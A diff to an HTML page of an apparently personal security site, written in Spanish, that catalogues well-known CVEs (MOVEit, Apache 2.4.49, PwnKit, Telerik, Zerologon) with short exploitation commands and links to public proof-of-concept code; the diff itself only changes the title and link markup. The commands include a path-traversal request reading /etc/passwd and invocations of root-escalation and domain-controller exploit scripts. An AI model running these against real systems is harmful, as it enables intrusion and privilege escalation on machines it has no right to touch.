@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>r4venn | CVEs</title>
+  <title>Underground | CVEs</title>
   <link rel="stylesheet" href="/css/styles.css"/>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/monokai-sublime.min.css">
@@ -35,8 +35,10 @@
       <h3>CVE-2023-34362 – MOVEit Transfer RCE</h3>
       <p><strong>Afecta:</strong> Progress MOVEit Transfer</p>
       <p>Exploit de SQL Injection + RCE no autenticado utilizado en ataques masivos por ransomware groups.</p>
-      <pre><code class="language-bash">curl -X POST https://target.com/moveitapi -d 'exploit_payload_here'</code></pre>
-      <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34362" target="_blank">Ver en NVD →</a>
+      <pre><code>curl -X POST https://target.com/moveitapi -d 'exploit_payload_here'</code></pre>
+      <div class="selection">
+        <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34362" class="btn">Ver en NVD ></a>
+      </div>
     </div>
 
     <div class="card">
@@ -44,7 +46,9 @@
       <p><strong>Afecta:</strong> Apache HTTP Server 2.4.49</p>
       <p>Permite leer archivos arbitrarios mediante URL encoding, incluso ejecutar código si tiene permisos de ejecución.</p>
       <pre><code class="language-bash">curl http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd</code></pre>
-      <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41773" target="_blank">Ver en NVD →</a>
+      <div class="selection">
+        <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41773" class="btn">Ver en NVD ></a>
+      </div>
     </div>
   </section>
 
@@ -57,7 +61,9 @@
       <p><strong>Afecta:</strong> sistemas Linux con `pkexec`</p>
       <p>Permite escalada de privilegios a root mediante manipulación de variables de entorno.</p>
       <pre><code class="language-bash">gcc pwnkit.c -o pwnkit && ./pwnkit</code></pre>
-      <a href="https://www.exploit-db.com/exploits/50878" target="_blank">Exploit en EDB →</a>
+      <div class="selection">
+        <a href="https://www.exploit-db.com/exploits/50878" class="btn">Exploit en EDB ></a>
+      </div>
     </div>
   </section>
 
@@ -70,7 +76,9 @@
       <p><strong>Afecta:</strong> Telerik UI para ASP.NET AJAX</p>
       <p>Permite ejecutar comandos en el servidor explotando una falla en el sistema de serialización.</p>
       <pre><code class="language-bash">python3 telerik_exploit.py -u http://target</code></pre>
-      <a href="https://github.com/bao7uo/dp_crypto" target="_blank">Script PoC →</a>
+      <div class="selection">
+        <a href="https://github.com/bao7uo/dp_crypto" class="btn"> Script PoC ></a>
+      </div>
     </div>
   </section>
 
@@ -83,12 +91,14 @@
       <p><strong>Afecta:</strong> Domain Controllers Windows Server</p>
       <p>Permite autenticación sin contraseña explotando Netlogon con vectores nulos.</p>
       <pre><code class="language-bash">python3 zerologon_tester.py 10.10.10.1</code></pre>
-      <a href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank">Exploit →</a>
+      <div class="selection">
+        <a href="https://github.com/SecuraBV/CVE-2020-1472" class="btn">Exploit ></a>
+      </div>
     </div>
   </section>
 
   <!-- Sidebar -->
-  <div class="social-sidebar">
+  <div class="social-sidebar fade-sidebar">
     <a href="https://app.hackthebox.com/profile/802825" target="_blank" title="Hack The Box">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" width="24" height="24" stroke-width="2">
         <path d="M12 3l8 4.5v9l-8 4.5-8-4.5v-9l8-4.5"></path>
